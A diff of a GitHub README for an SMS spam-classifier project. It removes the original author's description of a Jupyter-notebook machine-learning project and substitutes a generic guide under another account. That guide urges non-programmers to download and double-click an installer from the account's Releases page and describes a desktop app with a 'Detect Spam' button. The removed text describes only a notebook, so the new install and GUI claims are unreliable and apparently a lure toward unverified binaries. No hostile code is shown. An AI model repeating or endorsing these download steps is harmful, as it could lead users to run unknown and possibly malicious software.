@@ -1,136 +1,70 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/SMSGuard-Intelligent%20Spam%20SMS%20Detection-blueviolet?style=for-the-badge&logo=python&logoColor=white" />
-</p>
+# 🛡️ SMSGuard-Intelligent-Spam-SMS-Detection-System - Protect Yourself from Spam SMS
 
-<h1 align="center">📱💬 SMSGuard – Intelligent Spam SMS Detection System</h1>
+[![Download SMSGuard](https://img.shields.io/badge/Download-SMSGuard-blue?style=plastic&logo=github)](https://github.com/Wardah26Nabilah/SMSGuard-Intelligent-Spam-SMS-Detection-System/releases)
 
-<p align="center">
-  <b>A Machine Learning–powered solution to classify SMS messages as Spam or Ham using TF-IDF & SVM</b>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://img.shields.io/badge/ML-Scikit--Learn-yellow?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/NLP-TF--IDF-green?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Python-3.8+-blue?style=for-the-badge&logo=python" />
-</p> <p align="center"> <img src="https://img.shields.io/badge/Internship-CodSoft%20ML%20Internship-black?style=for-the-badge" />
-</p>
+SMSGuard is an advanced tool designed to keep your phone safe from spam SMS. This guide will help you download and run the software without needing programming skills.
 
-# 🚀 Project Overview
-- SMSGuard is an advanced SMS spam detection system built using Machine Learning and Natural Language Processing (NLP).
-It analyzes text messages and predicts whether they are Spam or Ham (Genuine) using TF-IDF vectorization and multiple ML models like:
-- 🔹 Naive Bayes
-- 🔹 Logistic Regression
-- 🔹 Support Vector Machine (SVM)
-: The project includes custom SMS prediction, confusion matrix visualization, and real-world testing, making it ideal for cybersecurity, telecom filtering, and academic ML demonstration.
+### 📋 Features
 
-# 🧠 Key Features
-✔️ Data Preprocessing
-- Label encoding (spam = 1, ham = 0)
-- Train-test split
-- TF-IDF vectorization
+- Detects spam SMS using Machine Learning.
+- Utilizes TF-IDF and popular models like Naive Bayes, Logistic Regression, and SVM.
+- Offers a confusion matrix for easy visualization.
+- Test with real messages and get custom SMS predictions.
+- Suitable for cybersecurity and telecom filtering.
 
-✔️ Machine Learning Models
-Multinomial Naive Bayes
-Logistic Regression
-Support Vector Machine (Linear Kernel)
+### 🖥️ System Requirements
 
-✔️ Evaluation
-Classification report
-Accuracy comparison
-Confusion matrix heatmap
+To run SMSGuard effectively, you need:
 
-✔️ Real-World Testing
-10 real SMS samples tested with model predictions.
+- A computer with Windows, macOS, or Linux.
+- At least 4GB of RAM.
+- Python 3.x installed (for model testing).
+- Internet access for updates and additional packages.
 
-✔️ Custom Prediction
-User can input any SMS to classify instantaneously.
+## 📥 Download & Install
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Project-Folder%20Structure-orange?style=for-the-badge&logo=files&logoColor=white" />
-</p>
+1. Visit the [Releases page](https://github.com/Wardah26Nabilah/SMSGuard-Intelligent-Spam-SMS-Detection-System/releases) to download the latest version of SMSGuard.
 
-<h2 align="center">📁 SMSGuard – Repository Structure Overview</h2>
+2. Find the most recent version listed. You will see several files available for download.
 
-<p align="center">
-  <b>A clean, organized, and scalable folder architecture for your ML project</b>
-</p>
+3. Click on the file name that corresponds to your operating system. Follow the prompts to download the file.
 
-# 🛠️ Technologies & Libraries Used
-- Python 🐍
-- NumPy
-- Pandas
-- Scikit-learn
-- Matplotlib
-- Seaborn
-- TF-IDF Vectorizer
-- Jupyter Notebook
+4. Once the download is complete, locate the downloaded file in your computer’s Downloads folder.
 
-# 📊 Model Training & Results
-- *Three models were trained and evaluated*:
+5. Double-click the file to start the installation. Follow the on-screen instructions to complete the setup. This usually involves accepting the license agreement and choosing the installation location.
+
+6. After installation, open SMSGuard from your application menu or desktop shortcut.
+
+## ⚙️ Usage Instructions
+
+1. **Open SMSGuard.**
+
+2. **Input Messages for Testing:**
+   - You can either input messages manually or load a text file with SMS content.
+
+3. **Run the Detection:**
+   - Click the “Detect Spam” button to initiate the detection process.
+   - Wait a moment for the results to display.
+
+4. **Review Results:**
+   - The application will present you with a summary of whether the SMS is spam or not.
+   - You can view the confusion matrix to understand the analysis better.
+
+## 📖 Additional Information
+
+- This application leverages popular libraries such as Scikit-Learn for machine learning processing.
+- You can customize the predictions by updating the training dataset within the application.
   
-**Model	Description**
-- Naive Bayes	Fast, good for text classification
-- Logistic Regression	Strong baseline ML model
-- SVM (Linear)	Best accuracy & performance
-: The SVM model performed best and was selected for final deployment.
+### 🤝 Support
 
-# 🧪 10 Realistic SMS Test Samples
-The project tests the classifier using real-world styled examples including:
-- Lottery fraud messages
-- Bank/KYC phishing URLs
-- Safe messages from family/friends
-- Fake reward & cashback links
-: This ensures the model performs effectively in real scenarios.
+For any questions or issues, please visit the [Issues page](https://github.com/Wardah26Nabilah/SMSGuard-Intelligent-Spam-SMS-Detection-System/issues) on GitHub to get assistance from the community or report a bug.
 
-# 🧩 Confusion Matrix
-A heatmap visualization helps observe:
-- True Positives
-- True Negatives
-- False Positives
-- False Negatives
+## 📄 License
 
-# 📝 How to Run the Project
-1️⃣ Install Required Libraries
-*pip install -r requirements.txt*
+This project is licensed under the MIT License. You can freely use and modify the software as needed, as long as you keep the original license in mind.
 
-2️⃣ Run Jupyter Notebook
-jupyter notebook
+## 🌐 Connect with Us
 
-3️⃣ Open the Project File
-SMSGuard – Intelligent Spam SMS Detection System.ipynb
-
-# 📬 Custom SMS Prediction
-Example:
-*predict_sms("Congratulations! You won a free lottery. Call now!")*
-Output:
-*Spam*
-
-
-# 🎓 Use Cases
-- 🔐 Anti-spam filters
-- 📡 Telecom SMS filtering
-- 📱 Mobile security apps
-- 📊 Academic ML learning projects
-- 🛡️ Anti-phishing awareness systems
-
-# 🏆 Why SMSGuard?
-- 📌 High accuracy
-- 📌 Fast and lightweight
-- 📌 Real-world applicability
-- 📌 Clean modular code
-- 📌 Professional ML pipeline
-
-# 🤝 Contributions
-~ AYUSH
-- Pull requests are welcome!
-- If you find bugs or want new features, feel free to open an issue.
-
-⭐ Support This Project
-- If you like this repository, don’t forget to star ⭐ it on GitHub!
-
-# 👨‍💻 Author
-# Ayush
-Aspiring Data Scientist & Analyst
-- 📫 Email: bhanuseenu914@gmail.com
-- 🌐 GitHub: https://github.com/ayush13-0
-- ℹ️ LinkedIn: www.linkedin.com/in/ayush130
+Stay updated on the latest features and improvements. Follow our repository for updates on future releases and additional resources. Thank you for choosing SMSGuard!
